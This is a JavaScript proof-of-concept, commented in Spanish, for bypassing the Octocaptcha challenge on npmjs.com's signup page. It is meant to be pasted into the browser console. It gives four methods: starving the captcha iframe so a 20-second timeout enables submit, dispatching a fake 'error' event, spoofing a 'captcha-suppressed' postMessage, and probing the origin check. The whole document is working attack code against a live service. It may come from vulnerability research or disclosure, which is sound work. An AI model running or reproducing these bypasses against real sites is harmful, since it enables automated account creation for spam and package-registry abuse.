// ================================================================
// PoC: Bypass de Octocaptcha en npmjs.com/signup
//
// INSTRUCCIONES:
// 1. Abrir https://www.npmjs.com/signup en el navegador
// 2. Abrir DevTools (F12) → Console
// 3. ANTES de que cargue el captcha, pegar y ejecutar este código
// 4. Observar que en 20 segundos aparece el checkmark verde
//    y el botón de submit se habilita SIN resolver captcha
// ================================================================


// ---- MÉTODO 1: Bloquear iframe del captcha ----
// El iframe tiene title="Please verify by completing this captcha."
// Si el iframe no carga, el timeout de 20s activa showSuccess()

console.log("=== PoC Octocaptcha Bypass ===");
console.log("[*] Buscando iframe de captcha...");

// Observar cambios en el DOM para detectar el captcha
const observer = new MutationObserver((mutations) => {
    const frame = document.querySelector('iframe[title*="captcha"]');
    if (frame) {
        console.log("[+] Iframe detectado:", frame.src);

        // Verificar estado actual
        checkCaptchaState();

        // Monitorear cada 5 segundos
        const interval = setInterval(() => {
            const result = checkCaptchaState();
            if (result.submitEnabled) {
                console.log("\n[!!!] BYPASS EXITOSO - Submit habilitado sin resolver captcha");
                clearInterval(interval);
                observer.disconnect();
            }
        }, 5000);

        // Timeout máximo de observación
        setTimeout(() => {
            clearInterval(interval);
            observer.disconnect();
            console.log("[*] Observación finalizada tras 30s");
            checkCaptchaState();
        }, 30000);
    }
});

observer.observe(document.body, { childList: true, subtree: true });

function checkCaptchaState() {
    const tokenInput = document.querySelector('input[name="octocaptchaToken"]');
    const errorInput = document.querySelector('input[name="errorLoadingCaptcha"]');
    const submitBtn = document.querySelector('button[type="submit"], input[type="submit"]');
    const frame = document.querySelector('iframe[title*="captcha"]');

    const state = {
        tokenValue: tokenInput ? tokenInput.value : 'N/A',
        errorLoading: errorInput ? errorInput.value : 'N/A',
        submitEnabled: submitBtn ? !submitBtn.disabled : false,
        frameVisible: frame ? frame.style.display !== 'none' : false,
        timestamp: new Date().toLocaleTimeString()
    };

    console.log(`[${state.timestamp}] Token: "${state.tokenValue}" | ErrorLoading: ${state.errorLoading} | Submit: ${state.submitEnabled ? 'HABILITADO' : 'deshabilitado'}`);

    return state;
}


// ---- MÉTODO 2: Forzar el error del iframe (más rápido) ----
// Despachar evento 'error' en el iframe para triggear showFailedCaptchaMessage()

console.log("\n[*] Para bypass inmediato, ejecutar después de que aparezca el captcha:");
console.log(`
// Forzar error en el iframe del captcha
const frame = document.querySelector('iframe[title*="captcha"]');
if (frame) {
    frame.dispatchEvent(new Event('error'));
    console.log("[*] Error event dispatched - verificando en 2s...");
    setTimeout(() => {
        const token = document.querySelector('input[name="octocaptchaToken"]');
        const error = document.querySelector('input[name="errorLoadingCaptcha"]');
        const btn = document.querySelector('button[type="submit"]');
        console.log("Token:", token?.value);
        console.log("ErrorLoading:", error?.value);
        console.log("Submit:", btn?.disabled ? "DESHABILITADO" : "HABILITADO");
    }, 2000);
}
`);


// ---- MÉTODO 3: Interceptar postMessage ----
// Simular el evento 'captcha-suppressed' que auto-completa el captcha

console.log("\n[*] Para bypass via postMessage, ejecutar:");
console.log(`
// Simular captcha-suppressed (como si GitHub suprimiera el captcha)
window.postMessage({ event: 'captcha-suppressed' }, '*');
console.log("[*] captcha-suppressed enviado");

// Verificar resultado
setTimeout(() => {
    const btn = document.querySelector('button[type="submit"]');
    console.log("Submit:", btn?.disabled ? "DESHABILITADO" : "HABILITADO");
}, 1000);
`);


// ---- MÉTODO 4: Verificar validación de origen débil ----
// El captcha valida: e.origin !== this.octocaptchaURL
// Verificar qué URL usa

console.log("\n[*] Verificando URL de Octocaptcha...");
setTimeout(() => {
    const frame = document.querySelector('iframe[title*="captcha"]');
    if (frame && frame.src) {
        const url = new URL(frame.src);
        console.log("[+] Octocaptcha URL:", url.origin);
        console.log("[+] Full src:", frame.src);
        console.log("[*] El origin check valida contra:", url.origin);
    }
}, 3000);
